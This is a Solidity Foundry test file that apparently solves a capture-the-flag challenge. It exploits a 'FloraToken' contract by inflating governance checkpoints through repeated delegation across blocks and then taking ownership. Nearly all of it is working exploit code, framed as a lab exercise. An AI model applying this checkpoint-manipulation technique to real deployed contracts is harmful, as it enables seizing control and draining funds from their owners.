// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/FloraToken.sol";
import "../src/Setup.sol";

contract FloraTokenExploit is Test {
    FloraToken floraToken;
    Setup setup;

    // Sets up challenge
    function setUp() external {
        vm.deal(address(this), 10 ether);
        setup = new Setup{value: 1 ether}();
        floraToken = setup.instance();
    }

    // Test to see if hack succeeded
    function testAttack() external {
        // Initial balance
        uint256 initialContractBalance = address(floraToken).balance;
        console.log("Initial FloraToken balance: %s", initialContractBalance);

        // Attack
        _increaseMyCheckpoints(3);
        _win();

        // Final balance
        uint256 finalContractBalance = address(floraToken).balance;
        console.log("Final FloraToken balance: %s", finalContractBalance);
        require(setup.isSolved(), "Attack failed!");
    }

    ////////////
    // INTERNAL
    ////////////

    function _increaseMyCheckpoints(uint256 _increaseCheckpointsBy) internal {
        console.log(
            "Initial checkpoints: %s\n",
            floraToken.numCheckpoints(address(this))
        );

        for (uint256 i = 0; i < _increaseCheckpointsBy; i++) {
            vm.roll(block.number + 1);

            floraToken.delegate(address(this));
            floraToken.delegate(address(floraToken));
        }
        console.log(
            "Final checkpoints: %s",
            floraToken.numCheckpoints(address(this))
        );
    }

    function _win() internal {
        floraToken.transferOwnership(address(this));
    }
}
